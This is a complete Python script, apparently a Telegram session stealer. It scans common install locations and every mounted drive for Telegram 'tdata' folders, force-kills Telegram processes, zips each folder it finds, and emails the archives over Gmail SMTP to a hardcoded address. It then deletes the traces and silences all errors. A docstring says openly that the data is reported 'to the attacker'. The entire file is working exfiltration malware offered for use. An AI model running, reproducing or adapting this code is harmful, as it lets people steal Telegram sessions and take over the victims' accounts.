import time, os, psutil, shutil, smtplib, tempfile, subprocess
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# start timer
# start_time = time.time()

# move current location to temp directory
temp_path = tempfile.gettempdir()
os.chdir(temp_path)

# create list to save tdata paths found
tdata_paths = []


def find_tdata_in(path):
    '''
    description: find tdata in specific location
    '''
    tdata_path = None
    for root, dirs, files in os.walk(path):
        for dir in dirs:        
            if 'telegram' in dir.lower():
                telegram_path = os.path.join(root, dir)

                tdata_path = os.path.join(telegram_path, 'tdata')
                if os.path.isdir(tdata_path) and tdata_path not in tdata_paths:
                    tdata_paths.append(tdata_path)


def terminate_td(): 
    '''
    description: kills Telegram processes if running
    '''
    if os.name == 'nt':
        import wmi
        f = wmi.WMI()
        for process in f.Win32_Process():
            if 'telegram' in process.name.lower():
                process.Terminate()
    else:
        processes = subprocess.Popen('ps -A', shell=True, stdout=subprocess.PIPE)
        output, error = processes.communicate()

        for line in output.splitlines():
            if 'telegram' in str(line).lower():
                pid = int(line.split(None, 1)[0])
                os.kill(pid, 9)


def send_zip(zip_path):
    '''
    description: report tdata zip to the attacker
    '''
    try:
        DESTINATION_ARCHIVE_NAME = zip_path
        SUBJECT = "Telegram Data {}".format(zip_path)
        # separate emails using comma
        RECIPIENTS = "white.tester.test@gmail.com" 

        server = "smtp.gmail.com"
        port = 587
        username = "yourgmailid"
        password = "yourAppPassword"
        sender = username

        msg = MIMEMultipart()
        msg['Subject'] = SUBJECT
        msg['From'] = sender
        msg['To'] = RECIPIENTS

        part = MIMEBase("application", "octet-stream")
        part.set_payload(open(DESTINATION_ARCHIVE_NAME, "rb").read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", "attachment; filename=\"%s\"" % (DESTINATION_ARCHIVE_NAME))
        msg.attach(part)

        smtp = smtplib.SMTP(server, port)
        smtp.ehlo()
        smtp.starttls()
        smtp.ehlo()
        smtp.login(username,password)
        smtp.sendmail(sender, RECIPIENTS, msg.as_string())
        smtp.close()

    except Exception as e:
        # print(e)
        pass



def create_archive_and_send_mail(source_path:str, dest_path:str):
    '''
    desciption: creates archive and send email 
    '''
    os.chdir(dest_path)
    terminate_td()
    zip_name = 'tdata_zip_file_{}'.format(time.time()) 
    shutil.make_archive(zip_name,'zip', dest_path, source_path)
    zip_path = os.path.join(dest_path, zip_name + '.zip')
    send_zip(zip_path)
    os.chdir(dest_path)
    os.remove(zip_path)

def search_in_paritions():
    '''
    description: search for telegram data in mounted partitions
    '''
    partitions = psutil.disk_partitions()
    for partition in partitions:
        find_tdata_in(partition.mountpoint)


# target os specific locations to search for tdata
if os.name == 'nt':
    probable_installation_paths = [ os.environ['APPDATA'],
                                    os.environ['ALLUSERSPROFILE'],
                                    os.environ['LOCALAPPDATA'],
                                    os.environ['PROGRAMW6432'],
                                    os.environ['PROGRAMFILES(X86)'],
                                    ]


else:
    probable_installation_paths = [os.environ['HOME'],
                                    ] 

# first search in probable installation locations
for path in probable_installation_paths:
    find_tdata_in(path) 

terminate_td()
search_in_paritions()
for tpath in tdata_paths:
    create_archive_and_send_mail(source_path=tpath, dest_path=temp_path)

# print('process Completed in ', time.time() - start_time)